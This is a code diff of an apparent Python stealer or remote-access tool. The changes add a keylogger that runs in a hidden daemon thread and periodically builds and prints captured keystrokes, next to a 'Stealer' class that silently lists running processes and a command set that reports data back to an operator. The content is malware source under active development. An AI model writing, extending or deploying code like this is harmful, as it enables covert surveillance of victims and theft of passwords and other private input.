@@ -5,13 +5,14 @@
 import asyncio
 import aiohttp
 
-import json
-import sys
 import os
 import socket
 import psutil
 import pyperclip as clipboard
 import subprocess
+import threading
+
+from z_logger import Keylogger
 
 from typing import Any
 
@@ -26,6 +27,9 @@ class Codes:
 class Commands:
 
     online_status = "Online Status"
+    keylogger_data = "Keylogger Data"
+
+keylogger = Keylogger(path = "", debug_state = False)
 
 blacklist = [
 
@@ -166,38 +170,38 @@ class Stealer:
     async def get_running_apps() -> list:
     
         try:
-            # Führt 'tasklist' aus und erfasst die Ausgabe
+            
             output = subprocess.check_output(
 
                 ["tasklist", "/fo", "csv", "/nh"],
                 text=True,
-                encoding="cp850",  # Wichtig für Umlaute/Kompatibilität
-                creationflags=subprocess.CREATE_NO_WINDOW  # Unterdrückt Konsolenfenster
+                encoding="cp850",
+                creationflags=subprocess.CREATE_NO_WINDOW
             )
 
-            # Extrahiert die Prozessnamen aus der CSV-Ausgabe
+            
             programs = []
 
             for line in output.splitlines():
 
-                if line.strip():  # Ignoriert leere Zeilen
+                if line.strip():
 
                     process_name = line.split('","')[0].strip('"')
                     programs.append(process_name)
 
-            return sorted(list(set(programs)))  # Duplikate entfernen & sortieren
+            return sorted(list(set(programs)))
 
-        except subprocess.CalledProcessError as e:
+        except subprocess.CalledProcessError as tasklist_error:
 
-            print(f"Fehler beim Ausführen von 'tasklist': {e}")
+            print(f"Tasklist Error: {tasklist_error}")
 
-            return []
+            return ["Error"]
         
-        except Exception as e:
+        except Exception as error:
 
-            print(f"Unerwarteter Fehler: {e}")
+            print(f"Error: {error}")
 
-            return []
+            return ["Error"]
         
     @staticmethod
     async def filter_running_apps(running_apps: list) -> list:
@@ -305,26 +309,45 @@ class ALA:
 
     async def ala(self): #! Mainloop
 
+        keylogger_thread = threading.Thread(target = keylogger.start, daemon = True)
+        keylogger_thread.start()
+
+        time_counter = 0
+
         while True:
 
-            try:
-
-                await self.send_online_status()
-                
-            except Exception as network_error:
-                
-                print(network_error)
+            #try:
+            #
+            #    await self.send_online_status()
+            #    
+            #except Exception as network_error:
+            #    
+            #    print(network_error)
 
             
-            unfiltered_running_apps = await Stealer.get_running_apps()
+            #unfiltered_running_apps = await Stealer.get_running_apps()
+            #
+            #filtered_running_apps = await Stealer.filter_running_apps(unfiltered_running_apps)
+            #
+            #for app in filtered_running_apps:
+            #
+            #    print(app)
 
-            filtered_running_apps = await Stealer.filter_running_apps(unfiltered_running_apps)
-            
-            for app in filtered_running_apps:
 
-                print(app)
 
-            await asyncio.sleep(5)
+            await asyncio.sleep(2)
+
+            time_counter += 1
+
+            if (time_counter % 5) == 0:
+
+                time_counter = 0
+
+                keylogger.build_data()
+                print(keylogger.get_built_data())
+                keylogger.clear_data()
+
+
 
     def run(self): #! Run
 
